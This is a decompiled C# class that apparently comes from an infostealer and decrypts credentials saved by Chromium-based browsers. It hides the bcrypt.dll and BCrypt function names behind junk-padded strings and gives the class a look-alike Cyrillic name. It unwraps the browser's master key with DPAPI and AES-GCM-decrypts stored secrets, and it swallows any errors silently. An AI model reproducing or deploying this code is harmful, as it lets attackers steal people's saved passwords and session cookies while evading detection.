using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

// Token: 0x02000006 RID: 6
public class IntРtr
{
	// Token: 0x06000013 RID: 19 RVA: 0x00003BB1 File Offset: 0x00001FB1
	public IntРtr()
	{
		this.irrpre = MemoryImport.LoadLibrary(Path.Combine(Environment.SystemDirectory, "bcrFileStream.IOypt.dFileStream.IOll".Replace("FileStream.IO", string.Empty)));
	}

	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000014 RID: 20 RVA: 0x00003BE4 File Offset: 0x00001FE4
	private IntPtr irrpre { get; }

	// Token: 0x06000015 RID: 21 RVA: 0x00003BEC File Offset: 0x00001FEC
	public uint D_1(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags)
	{
		return MemoryImport.Func<IntРtr.m1>(MemoryImport.GetProcAddress(this.irrpre, "BCrstring.EmptyyptOpestring.EmptynAlgorithmProvistring.Emptyder".Replace("string.Empty", string.Empty)))(out phAlgorithm, pszAlgId, pszImplementation, dwFlags);
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00003C2C File Offset: 0x0000202C
	public uint D_2(IntPtr hAlgorithm, uint flags)
	{
		return MemoryImport.Func<IntРtr.m2>(MemoryImport.GetProcAddress(this.irrpre, "BCruintyptCloseAlgorituinthmProvuintider".Replace("uint", string.Empty)))(hAlgorithm, flags);
	}

	// Token: 0x06000017 RID: 23 RVA: 0x00003C6C File Offset: 0x0000206C
	public uint D_3(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags)
	{
		return MemoryImport.Func<IntРtr.D7>(MemoryImport.GetProcAddress(this.irrpre, "BCrUnmanagedTypeyptDecrUnmanagedTypeypt".Replace("UnmanagedType", string.Empty)))(hKey, pbInput, cbInput, ref pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, ref pcbResult, dwFlags);
	}

	// Token: 0x06000018 RID: 24 RVA: 0x00003CB8 File Offset: 0x000020B8
	public uint D_4(IntPtr hKey)
	{
		return MemoryImport.Func<IntРtr.D6>(MemoryImport.GetProcAddress(this.irrpre, "BCrhKeyyptDeshKeytroyKhKeyey".Replace("hKey", string.Empty)))(hKey);
	}

	// Token: 0x06000019 RID: 25 RVA: 0x00003CF4 File Offset: 0x000020F4
	public uint D_5(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags)
	{
		return MemoryImport.Func<IntРtr.D3>(MemoryImport.GetProcAddress(this.irrpre, "BCpszPropertyryptGepszPropertytPropepszPropertyrty".Replace("pszProperty", string.Empty)))(hObject, pszProperty, pbOutput, cbOutput, ref pcbResult, flags);
	}

	// Token: 0x0600001A RID: 26 RVA: 0x00003D38 File Offset: 0x00002138
	public uint D_6(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags)
	{
		return MemoryImport.Func<IntРtr.D4>(MemoryImport.GetProcAddress(this.irrpre, "BCEncodingryptSEncodingetPrEncodingoperEncodingty".Replace("Encoding", string.Empty)))(hObject, pszProperty, pbInput, cbInput, dwFlags);
	}

	// Token: 0x0600001B RID: 27 RVA: 0x00003D7C File Offset: 0x0000217C
	public uint D_7(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags)
	{
		return MemoryImport.Func<IntРtr.D5>(MemoryImport.GetProcAddress(this.irrpre, "BCrbMasterKeyyptImbMasterKeyportKbMasterKeyey".Replace("bMasterKey", string.Empty)))(hAlgorithm, hImportKey, pszBlobType, out phKey, pbKeyObject, cbKeyObject, pbInput, cbInput, dwFlags);
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00003DC8 File Offset: 0x000021C8
	public static string Decrypt(byte[] bMasterKey, string chiperText)
	{
		Encoding encoding = Encoding.GetEncoding("windows-1251");
		byte[] array = new byte[bMasterKey.Length - 5];
		Array.Copy(bMasterKey, 5, array, 0, bMasterKey.Length - 5);
		byte[] bMasterKey2 = CryptoHelper.DecryptBlob(array, DataProtectionScope.CurrentUser, null);
		return encoding.GetString(IntРtr.Decrypt(encoding.GetBytes(chiperText), bMasterKey2));
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00003E1C File Offset: 0x0000221C
	private static byte[] Decrypt(byte[] bEncryptedData, byte[] bMasterKey)
	{
		byte[] array = new byte[]
		{
			1,
			2,
			3,
			4,
			5,
			6,
			7,
			8,
			0,
			0,
			0,
			0
		};
		Array.Copy(bEncryptedData, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[bEncryptedData.Length - 15];
			Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			IntРtr intРtr = new IntРtr();
			return intРtr.Get(bMasterKey, array, null, array4, array3);
		}
		catch (Exception ex)
		{
		}
		return null;
	}

	// Token: 0x0600001E RID: 30 RVA: 0x00003ED4 File Offset: 0x000022D4
	private byte[] Get(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
	{
		IntPtr intPtr = this.OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
		IntPtr hKey;
		IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
		byte[] array2;
		using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
		{
			byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
			int num = 0;
			uint num2 = this.D_3(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0);
			bool flag = num2 > 0U;
			if (flag)
			{
				throw new CryptographicException();
			}
			array2 = new byte[num];
			num2 = this.D_3(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
			bool flag2 = num2 == 3221266434U;
			if (flag2)
			{
				throw new CryptographicException();
			}
			bool flag3 = num2 > 0U;
			if (flag3)
			{
				throw new CryptographicException();
			}
		}
		this.D_4(hKey);
		Marshal.FreeHGlobal(hglobal);
		this.D_2(intPtr, 0U);
		return array2;
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00003FE0 File Offset: 0x000023E0
	private int MaxAuthTagSize(IntPtr hAlg)
	{
		byte[] property = this.GetProperty(hAlg, "AuthTagLength");
		return BitConverter.ToInt32(new byte[]
		{
			property[4],
			property[5],
			property[6],
			property[7]
		}, 0);
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00004024 File Offset: 0x00002424
	private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		IntPtr zero = IntPtr.Zero;
		uint num = this.D_1(out zero, alg, provider, 0U);
		bool flag = num > 0U;
		if (flag)
		{
			throw new CryptographicException();
		}
		byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
		num = this.D_6(zero, "ChainingMode", bytes, bytes.Length, 0);
		bool flag2 = num > 0U;
		if (flag2)
		{
			throw new CryptographicException();
		}
		return zero;
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00004088 File Offset: 0x00002488
	private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		byte[] property = this.GetProperty(hAlg, "ObjectLength");
		int num = BitConverter.ToInt32(property, 0);
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		byte[] array = this.Concat(new byte[][]
		{
			BitConverter.GetBytes(1296188491),
			BitConverter.GetBytes(1),
			BitConverter.GetBytes(key.Length),
			key
		});
		uint num2 = this.D_7(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, intPtr, num, array, array.Length, 0U);
		bool flag = num2 > 0U;
		if (flag)
		{
			throw new CryptographicException();
		}
		return intPtr;
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00004118 File Offset: 0x00002518
	private byte[] GetProperty(IntPtr hAlg, string name)
	{
		int num = 0;
		uint num2 = this.D_5(hAlg, name, null, 0, ref num, 0U);
		bool flag = num2 > 0U;
		if (flag)
		{
			throw new CryptographicException();
		}
		byte[] array = new byte[num];
		num2 = this.D_5(hAlg, name, array, array.Length, ref num, 0U);
		bool flag2 = num2 > 0U;
		if (flag2)
		{
			throw new CryptographicException();
		}
		return array;
	}

	// Token: 0x06000023 RID: 35 RVA: 0x00004174 File Offset: 0x00002574
	public byte[] Concat(params byte[][] arrays)
	{
		int num = 0;
		foreach (byte[] array in arrays)
		{
			bool flag = array == null;
			if (!flag)
			{
				num += array.Length;
			}
		}
		byte[] array2 = new byte[num - 1 + 1];
		int num2 = 0;
		foreach (byte[] array3 in arrays)
		{
			bool flag2 = array3 == null;
			if (!flag2)
			{
				Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
				num2 += array3.Length;
			}
		}
		return array2;
	}

	// Token: 0x02000046 RID: 70
	// (Invoke) Token: 0x060001C9 RID: 457
	private delegate uint m1(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

	// Token: 0x02000047 RID: 71
	// (Invoke) Token: 0x060001CD RID: 461
	private delegate uint m2(IntPtr hAlgorithm, uint flags);

	// Token: 0x02000048 RID: 72
	// (Invoke) Token: 0x060001D1 RID: 465
	private delegate uint D3(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

	// Token: 0x02000049 RID: 73
	// (Invoke) Token: 0x060001D5 RID: 469
	private delegate uint D4(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

	// Token: 0x0200004A RID: 74
	// (Invoke) Token: 0x060001D9 RID: 473
	private delegate uint D5(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

	// Token: 0x0200004B RID: 75
	// (Invoke) Token: 0x060001DD RID: 477
	private delegate uint D6(IntPtr hKey);

	// Token: 0x0200004C RID: 76
	// (Invoke) Token: 0x060001E1 RID: 481
	private delegate uint D7(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);
}
